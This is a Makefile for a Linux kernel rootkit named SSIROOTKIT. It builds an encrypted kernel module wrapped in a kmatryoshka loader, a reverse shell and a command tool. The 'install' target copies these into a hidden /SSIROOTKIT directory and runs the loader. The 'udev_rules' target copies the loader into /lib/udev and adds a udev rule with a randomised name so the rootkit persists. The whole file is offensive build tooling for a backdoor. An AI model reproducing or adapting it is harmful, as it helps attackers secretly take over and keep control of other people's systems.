PWD := $(shell pwd)
SHELL_DIR := /home/anass/myprojects/extra-backdoor/shell/
SHELL := /bin/bash
BUILD_DIR ?= $(PWD)/output
HIDE:= "SSIROOTKIT"
UDEV_DIR :=/lib/udev
include /home/anass/myprojects/extra-backdoor/Kbuild
RULE_NAME := $(shell shuf -i 50-99 -n 1)-$(HIDE).rules
RULE_FILE := /lib/udev/rules.d/$(RULE_NAME)
LOADER := $(PWD)/loader/loader.c
MODULE_DIR ?= $(PWD)/kernel
ENCRYPT_SRC:= $(PWD)/encrypt/encrypt.c
ENCRYPT:= $(BUILD_DIR)/encrypt
KMATRYOSHKA_DIR ?= $(PWD)/kmatryoshka
PARASITE ?= $(BUILD_DIR)/SSIROOTKIT_module.ko
CC := gcc
RAND1 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')
RAND2 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')

$(ENCRYPT): $(ENCRYPT_SRC)
	 gcc -I$(PWD) -std=c99 $< -o $@
$(BUILD_DIR):	
	@ mkdir -p $(BUILD_DIR)
$(HIDE):
	@ mkdir -p /$(HIDE)
kmatryoshka:
	$(ENCRYPT) $(PARASITE) $(RAND1) > $(BUILD_DIR)/parasite_blob.inc
	$(MAKE) -C $(KERNEL) M=$(BUILD_DIR) src=$(KMATRYOSHKA_DIR)
ssirootkit:$(LOADER)
	 $(ENCRYPT) $(BUILD_DIR)/SSIROOTKIT.ko $(RAND2) > $(BUILD_DIR)/SSIROOTKIT.ko.inc
	 echo "  CC      $(BUILD_DIR)/$@"
	 $(CC) -I$(PWD) -I$(BUILD_DIR) $< -o $(BUILD_DIR)/$@
	
udev_rules: $(HIDE) $(BUILD_DIR)
	cp  -v $(BUILD_DIR)/ssirootkit $(UDEV_DIR) 
	cp -v $(PWD)/rule $(RULE_FILE) 
cmd: $(BUILD_DIR)
	gcc -o $(BUILD_DIR)/cmd $(SHELL_DIR)/cmd.c  

install : $(BUILD_DIR) $(HIDE) 
	cp $(BUILD_DIR)/cmd /$(HIDE)/$(HIDE)_cmd
	cp $(BUILD_DIR)/reverse_shell /$(HIDE)/$(HIDE)_shell
	cp $(BUILD_DIR)/ssirootkit /$(HIDE)/$(HIDE)
	/$(HIDE)/$(HIDE)
reverse_shell: $(SHELL_DIR)/shell.c $(BUILD_DIR)
	gcc -o $(BUILD_DIR)/reverse_shell $(SHELL_DIR)shell.c $(SHELL_DIR)/sha1.c $(SHELL_DIR)/pel.c $(SHELL_DIR)/aes.c 
module: $(BUILD_DIR)
	make -C /lib/modules/$(shell uname -r)/build M=$(BUILD_DIR) src=$(PWD)

all: module reverse_shell  cmd  $(ENCRYPT)  ssirootkit install udev_rules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm -rf $(CONFIG_FILE)
	rm -rf $(BUILD_DIR)
# $(MAKE) -C $(TSH_DIR) clean
